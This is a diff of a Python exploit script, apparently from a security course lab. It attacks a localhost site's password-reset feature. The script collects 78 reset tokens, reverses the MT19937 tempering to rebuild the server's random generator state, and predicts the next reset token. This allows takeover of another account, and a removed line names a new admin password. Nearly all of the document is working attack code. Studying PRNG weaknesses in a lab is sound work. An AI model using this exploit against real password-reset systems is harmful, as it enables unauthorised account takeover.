@@ -11,43 +11,49 @@ SITE_URL  = "http://localhost:8080"
 
 USERNAME = "hayk"
 PASSWORD = "123456"
-NEW_ADMIN_PASS = "hacked123"
 
 # MT19937 tempering constants
-B = 0x9D2C5680
-C = 0xEFC60000
+b = 0x9D2C5680
+c = 0xEFC60000
+l = 18
+t = 15
+s = 7
+u = 11
 
-
-# Undo the temper in reverse order
+# Undo the temper in reverse order, masking after each step
+# Used this source to help understand:
+    # https://occasionallycogent.com/inverting_the_mersenne_temper/index.html
+    
 def undoTemper(z):
 
-    # undo: y ^= (y >> l)  where l = 18
-    # Recover bits top-down: each pass recovers another 18 bits
+
+    # undo: y ^= (y >> l)
     y = z
-    for _ in range(32 // 18 + 1):
+    for i in range(32 // l + 1):
         y = z ^ (y >> 18)
+    
     y = y & 0xFFFFFFFF
 
-    # undo: y ^= (y << t) & c  where t = 15, c = C
-    # Recover bits bottom-up: each pass recovers another 15 bits
+    # undo: y ^= (y << t) & c
     x = y
-    for _ in range(32 // 15 + 1):
-        x = y ^ ((x << 15) & C)
+    for i in range(32 // 15 + 1):
+        x = y ^ ((x << 15) & c)
+    
     x = x & 0xFFFFFFFF
 
-    # undo: y ^= (y << s) & b  where s = 7, b = B
-    # Recover bits bottom-up: each pass recovers another 7 bits
+    # undo: y ^= (y << s) & b
     w = x
-    for _ in range(32 // 7 + 1):
-        w = x ^ ((w << 7) & B)
+    for i in range(32 // s + 1):
+        w = x ^ ((w << s) & b)
+    
     w = w & 0xFFFFFFFF
 
-    # undo: y ^= (y >> u)  where u = 11
-    # Recover bits top-down: each pass recovers another 11 bits
+    # undo: y ^= (y >> u)
     v = w
-    for _ in range(32 // 11 + 1):
+    for i in range(32 // 11 + 1):
         v = w ^ (v >> 11)
     v = v & 0xFFFFFFFF
+
 
     return v
 
@@ -57,8 +63,8 @@ def sendRequest(session, username):
     return session.post(SITE_URL + "/forgot", data={"user": username})
 
 
-# Extract the base64 token from the response and decode it into 8 MT outputs
-def parseToken(response):
+# Decodes base64 token to 8 MT19937 outputs
+def decodeToken(response):
 
     # Bounds check
     start = response.text.find('<!--open_token-->')
@@ -83,19 +89,19 @@ def task2():
 
     # Collect 78 tokens
     print("Sending 78 password requests!")
-    observed = []
+    list = []
     for i in range(78):
         response = sendRequest(session, USERNAME)
-        token = parseToken(response)
+        token = decodeToken(response)
 
         if not token:
             return
 
-        observed.extend(token)
+        list.extend(token)
 
     # Unmix each output
     print("Undoing temper")
-    mtState = [undoTemper(v) for v in observed]
+    mtState = [undoTemper(v) for v in list]
     print("Recovered " + str(len(mtState)) + " values")
 
     # Initialize MT19937
@@ -106,8 +112,8 @@ def task2():
     clone.index = 624
 
     # Predict the next 8 outputs from MT19937
-    # ^ the server generates 256 bit random number
-    # 8 * 32 bits = 256 <-------
+        # the server generates 256 bit random number
+        # 8 * 32 bits = 256
     outputs = [str(clone.extract_number()) for i in range(8)]
 
     # Join the outputs and base64 encode
